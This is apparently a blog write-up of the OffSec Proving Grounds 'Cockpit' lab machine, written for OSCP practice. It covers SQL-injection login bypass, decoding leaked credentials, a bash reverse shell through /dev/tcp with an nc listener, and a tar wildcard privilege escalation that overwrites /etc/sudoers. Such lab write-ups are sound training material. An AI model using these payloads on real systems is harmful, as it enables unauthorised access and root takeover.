# 🔌 OSCP Proving Grounds

> **Original Source:** [OSCP Proving Grounds](https://medium.com/@carlosbudiman/oscp-proving-grounds-cockpit-intermediate-linux-2d2be64ebfa4)
> **Platform:** medium.com | **Category:** `HARDWARE / IoT`


---

## 📝 Full Writeup

OSCP Proving Grounds | Cockpit | Intermediate | Linux[![apple of my eye](https://miro.medium.com/v2/resize:fill:64:64/1*X1ZDp8AqtVXycioDvPTK-Q.jpeg)

](/web/20251127225540/https://medium.com/@carlosbudiman?source=post_page---byline--2d2be64ebfa4---------------------------------------)

[apple of my eye](/web/20251127225540/https://medium.com/@carlosbudiman?source=post_page---byline--2d2be64ebfa4---------------------------------------)

·
Jan 17, 2025

[

](/web/20251127225540/https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F2d2be64ebfa4&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40carlosbudiman%2Foscp-proving-grounds-cockpit-intermediate-linux-2d2be64ebfa4&user=apple+of+my+eye&userId=cf690dc9fc87&source=---header_actions--2d2be64ebfa4---------------------clap_footer------------------)

--


Just an normal guy preparing for the OSCP+ Exam :). Just a quick writeup about the Cockpit machine, which I found pretty easy.

My third published write up, using this as practice to polish my note taking and story-telling skills.

**Cockpit | Proving Grounds, Linux, Difficulty : Intermediate**

Kali Machine : 192.168.45.204
Target machine : 192.168.162.10

**Enumeration**

Once again I used autorecon for my enumeration, before the full scan loads, I usually quickly just see the quick tcp scans.

From the scans it’s obvious this box would be more of a web app route.

Used dirhunt to enumerate the directories and found the login.php page.

Tried searching any exploits regarding ‘blaze by JDgodd’, and found a couple of potential hints but mostly talking about how it’s vulnerable to SQL injections.
[
## OffSec's Exploit Database Archive
### Blaze Apps 1.x - SQL Injection / HTML Injection.. webapps exploit for Multiple platform

www.exploit-db.com

](https://www.exploit-db.com/exploits/33995?source=post_page-----2d2be64ebfa4---------------------------------------)
[
## OffSec's Exploit Database Archive
### Blaze Apps - Multiple Vulnerabilities.. webapps exploit for ASP platform

www.exploit-db.com

](https://www.exploit-db.com/exploits/12734?source=post_page-----2d2be64ebfa4---------------------------------------)

So I tried entering SQL payloads, to authenticate, when doing the blind sql injections I got this output :

Luckily, there’s no system that would block our IP or anything like that, so this was just a useless warning.

When entering any thing with a single quotation it shows the error, and reveals that it is using a MySQL Server. It seems that it doesn’t handle single quotation marks well, but it does handle double quotation marks, so our payload can’t involve double quotation marks. I refered to the below after searching ‘MYSQL login authentication bypass github’ :

[
## fuzzdb/attack/sql-injection/exploit/mysql-injection-login-bypass.txt at master ·…
### Dictionary of attack patterns and primitives for black-box application fault injection and resource discovery. …

github.com

](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/exploit/mysql-injection-login-bypass.txt?source=post_page-----2d2be64ebfa4---------------------------------------)

Payload :

```
admin:'OR '' = '
```

We get access to some passwords! I used a hashes.com to identify that these are actually base64 encodings, and the same website could directly decrypt, so that was very useful haha.

So now we got two credentials :

```
james:Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=:canttouchhhthiss@455152
cameron:dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy:thisscanttbetouchedd@455152
```

I tried using them for SSH connection and relogging in to the blaze app but no use.

**PORT 9090**

Opening it, we are greeted with a login page where you can I used James’ login details, and it worked!

What I found most interesting after crawling through the website was that there was a direct terminal access :0.

So let’s get a reverse shell :

Got this from pentestmonkey’s revshelll cheatsheet :

```
bash -i >& /dev/tcp/<ip>/8080 0>&1

#on kali machine ; 
nc -lnvp 8080
```

Checking sudo permissions that James have
I then search tar at the GTFObins library and found this :

It seems that if we are able to manipulate the flags of tar, we can use it to execute /bin/bash which will give us root.

I tried executing it by creating the second file, but it wouldn’t let me add this file name. So it’s back to searching again.

Then after searching “exploiting tar sudo privilege escalation”, the top result is this medium article that explains how the wildcard can be manipulated as it takes in every file in the directory. So you could potentially create files that uses tar flags that would then execute a potential malicious file that could help us privilege escalate.
[
## Linux Privilege Escalation: Wildcards with tar
### I recently discovered a creative and unique Linux privilege escalation vector that exploits they way the wildcard…

medium.com

](/web/20251127225540/https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa?source=post_page-----2d2be64ebfa4---------------------------------------)

It highlights creating two files that would manipulate the — checkpoint flag in order to execute our final ‘privilege escalator’ script.

```
# 1. Create files in the current directory called 
# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh' 
 
echo "" > '--checkpoint=1' 
echo "" > '--checkpoint-action=exec=sh privesc.sh' 
 
# 2. Create a privesc.sh bash script, that allows for privilege escalation 
#malicous.sh: 
echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers 
 
#The above injects an entry into the /etc/sudoers file that allows the 'kali' 
#user to use sudo without a password for all commands 
#NOTE: we could have also used a reverse shell, this would work the same! 
#OR: Even more creative, you could've used chmod to changes the permissions 
#on a binary to have SUID permissions, and PE that way
```

Above is taken from the medium article.

Since the backup.tar.gz will be executed on the /tmp file, we need to do these commands on the tmp file. this is what your tmp file should look like :

Taken from the blaze web

Don’t forget to give execute permissions to the malicious shell script, then run the privileged tar command.
We not have access to root without the need of passwords via SUDO.

**Thank you for reading!**

Learnt a lot from this box, from SQL injection vector for authentication bypass then privilege escalating by manipulating the flags, thought me to research and enumerate more and more!

---
